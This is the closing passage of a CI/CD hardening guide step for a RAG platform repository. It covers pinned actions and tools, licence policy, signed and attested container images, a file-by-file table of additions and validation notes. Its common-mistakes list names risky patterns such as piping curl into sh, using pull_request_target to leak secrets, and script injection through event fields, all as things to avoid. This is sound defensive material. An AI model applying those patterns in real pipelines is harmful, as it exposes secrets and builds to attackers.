| Public / open-source repository | Remove the self-hosted runner; add OpenSSF Scorecard; keep signing and attestations |
| Regulated environment | Add a merge queue, reusable workflows for SLSA build level 3, and retention of SBOMs per release |
| Air-gapped deployment | Sign with a key pair held in an HSM or KMS; mirror the scanners' vulnerability databases |
| Many repositories | Shared reusable workflows and organisation rulesets; Renovate for pins |

## Common mistakes

- `uses: some/action@v3` (or `@main`): trusting whoever controls that tag tomorrow.
- `pull_request_target` with a checkout of the PR's code: the classic way to leak secrets to any stranger.
- `${{ github.event.* }}` inside `run:` scripts: script injection. Pass values through `env:`.
- Default write permissions for every job.
- Downloading tools with `curl | sh` or "latest" in CI.
- Signing or scanning a tag instead of the digest you deploy.
- Self-hosted runners on public repositories.
- Treating a green scanner as proof of safety, or ignoring licences until a customer asks.
- A CI that runs different commands from developers' machines, so failures can't be reproduced.
- Trailing comments in Dockerfiles.

## Done when

- [ ] `just tools` installs eight verified tools; `just ci` passes locally
- [ ] `ci.yml`, `release.yml`, `evals.yml`, `dependabot.yml` and `actionlint.yaml` are committed; actionlint and
      zizmor report nothing
- [ ] The Dockerfile copies every workspace member's manifest and the prompt registry, and the image builds in CI
- [ ] A pull request shows the three CI jobs green; merging requires them plus a Code Owner review
- [ ] After a merge, the release run publishes `ghcr.io/…/rag-api@sha256:…` and `just image-verify` passes
- [ ] The `evals` environment requires your approval; the runner has the `rag-models` label
- [ ] `just audit-test` passes (190 in the guide's count)
- [ ] ADR-0027 is merged through the pipeline itself

## Recap

> **RECAP**
> The platform now has a factory inspection line:
> - **the same checks everywhere:** `just ci` on your Mac and in GitHub, every test plus policy, prompt, card and
>   dashboard checks
> - **trusted inputs:** actions pinned by SHA, tools by SHA-256, dependencies audited and licence-checked, secrets
>   scanned
> - **a hardened pipeline:** read-only tokens, no dangerous triggers, workflow security scanning, a guarded
>   self-hosted runner for evaluations
> - **sealed outputs:** images built once, scanned, and shipped with an SBOM, provenance and a keyless signature on
>   the digest
>
> It already paid for itself, catching an image build that Step 26 had broken. Next, Step 28, Vault: secrets that
> are issued on demand, short-lived and audited, instead of long-lived passwords in files.

## What was added to the repo in this step

| File | Purpose |
|---|---|
| `ci/tools.yaml` | Exact version, URL and SHA-256 of the eight tool binaries, for Linux (CI) and Apple-silicon macOS. |
| `scripts/ci_tools.py` | `just tools`: downloads, verifies the hash, then extracts and installs into `.tools/bin`. |
| `ci/licence-policy.yaml` | Which dependency licences are allowed, need a recorded reason, or are denied; verified exceptions. |
| `scripts/licences.py` | `just licences`: checks every installed package's licence against the policy. |
| `justfile` | New `tools`, `ci`, `ci-static`, `ci-test`, `ci-config`, `ci-supply-chain`, `licences`, `image-scan` and `image-verify` recipes; the `check` comment now points at them. |
| `services/rag-api/Dockerfile` | Copies `libs/rag-evals/pyproject.toml` so `uv sync --locked` works again (the Step 26 break). |
| `.github/workflows/ci.yml` | Checks, supply-chain and image jobs on every PR, push to `main` and merge queue. |
| `.github/workflows/release.yml` | On `main`: build once, push by digest, keyless signature, provenance and SBOM attestations. |
| `.github/workflows/evals.yml` | Step 26's evaluations on the self-hosted Mac runner, same-repo PRs only, behind an approval. |
| `.github/actionlint.yaml` | Declares the `rag-models` self-hosted runner label. |
| `.github/dependabot.yml` | Weekly update PRs for action SHAs, `uv.lock` and the Dockerfile's base images. |
| `tests/test_ci_policy.py` | The pipeline's own rules (pinning, permissions, triggers, fork guard, same recipes, Dockerfile vs workspace). |
| `tests/test_ci_tools.py` | The installer refuses bad hashes, archive tricks, plain http and unknown platforms; the manifest is complete. |
| `tests/test_licences.py` | Licence expressions, metadata sources, verdicts, and the real environment. |
| `.gitignore` | Ignores `.tools/` (downloaded binaries, the exported requirements, local SBOMs). |
| `.envrc` | `PATH_add .tools/bin`, so the pinned tools come first on your PATH. |
| `pyproject.toml` | `ruff format` skips Markdown files (see notes). |
| `docs/adr/0027-run-ci-with-pinned-tools-and-publish-signed-attested-images.md` | ADR-0027 (and its row in `docs/adr/README.md`). |

## Notes for this repository

- **Every pin was checked against the source.** All eight action SHAs were confirmed with `git ls-remote` on the
  action repositories (each tag points at exactly the guide's commit). All sixteen tool hashes were confirmed:
  the Linux binaries by downloading them (`just tools` verifies and installs all eight here), the macOS ones
  against each project's published checksum file (dbmate's macOS binary was downloaded and hashed, since dbmate
  publishes none).
- **The Postgres service digest** is the one already pinned for `rag-db` in `infra/compose/compose.yaml` and in
  `just audit-test` (`sha256:ac08538c…a75d`); the guide leaves it as `<digest>` to fill in.
- **The Dockerfile keeps its digest pins.** The guide prints the base images as tags only
  (`ghcr.io/astral-sh/uv:0.11.32`, `python:3.12-slim-bookworm`); this repository already pinned them by
  tag@digest in Step 17, and Dependabot's `docker` ecosystem updates both. Only the `rag-evals` manifest line (with
  its comment on its own line) was added; the prompt registry `COPY` was already present from Step 24.
- **Two extra licence decisions.** This repository's environment has 107 packages (the guide's had 93), and two of
  them weren't covered by the guide's policy: `Events` 0.5 (pulled in by opensearch-py) declares only "BSD"; its
  LICENSE file was read and is the 3-clause BSD text, so it is listed under `exceptions` as BSD-3-Clause. `numpy`
  declares `BSD-3-Clause AND 0BSD AND MIT AND Zlib AND CC0-1.0`; `CC0-1.0` (a public-domain dedication) was added to
  `allowed`. Result: `107 packages: 104 ok, 3 review, 0 unknown, 0 denied`.
- **`ruff format` skips Markdown.** The locked ruff (0.17) also formats Python code blocks inside `.md` files, so
  `ruff format --check .` failed on the earlier step write-ups, whose code blocks quote the guide as printed.
  `[tool.ruff.format] exclude = ["*.md"]` keeps the check about code. The pre-commit hook was unaffected (it only
  passes `.py` files).
- **A shellcheck finding in `evals.yml`.** On GitHub-hosted runners actionlint also runs shellcheck, which flags
  the guide's `ls -d evals/runs/*-retrieval-* | tail -1` (SC2012, "use find instead of ls"); that would have made
  the supply-chain job red. The run folders are timestamped names, so `ls` sorting is exactly what's wanted: the
  two gate steps keep the guide's command and carry a `# shellcheck disable=SC2012` line with the reason.
  actionlint (with shellcheck) and zizmor report nothing.
- **`just licences`.** The licence policy's header says "Checked by `just licences`", but the guide's justfile
  doesn't define it; a small `licences` recipe was added (`ci-supply-chain` still calls the script directly).
- **The `check` recipe** (Step 5) said "Step 27 calls exactly this"; CI calls the `ci-*` recipes instead (`check`
  needs Homebrew), so its comment now says so.
- **This repository is public.** `evals.yml` follows the guide (fork guard + approval environment). GitHub advises
  against attaching self-hosted runners to public repositories; until you register a `rag-models` runner, an
  `evals` job for a same-repo pull request that touches prompts or evals just waits in the queue (and times out
  after 24 hours) without running anything. Remove `evals.yml` or keep the repository private if you won't attach
  the Mac.
- **Branch protection, environments and Actions settings** are clicks in GitHub (section 8); they aren't files and
  were not changed from here.
- **What was validated in this container:** `just tools` (all eight verified); `just ci-static`; `just ci-test`
  and `just audit-test` (455 passed with the throwaway Postgres, matching what CI's service gives the checks job);
  `just ci-config` (including `alerts-test` with Docker); `just policy-check` (24/24); `just ci-supply-chain`
  (gitleaks, actionlint, zizmor offline, pip-audit, licences, Trivy config: all clean); the Dockerfile's dependency
  stage simulated before and after the fix (the `--locked` error, then success); a full image build (with the
  ghcr.io uv stage replaced by the same uv 0.11.32 binary, because this sandbox can't download ghcr.io blobs)
  showing no rag-evals, moto or ruamel in the image; `trivy image` (no fixable HIGH/CRITICAL); `syft` (CycloneDX
  SBOM); and the offline cosign sign/verify/tamper demo. Not testable here: the release workflow's push,
  keyless signing and attestations (they need GitHub's OIDC) and zizmor's online audits (they need a GitHub
  token).
- **Test counts differ from the guide's.** This repository has more tests from earlier steps; this step adds the
  guide's 20.
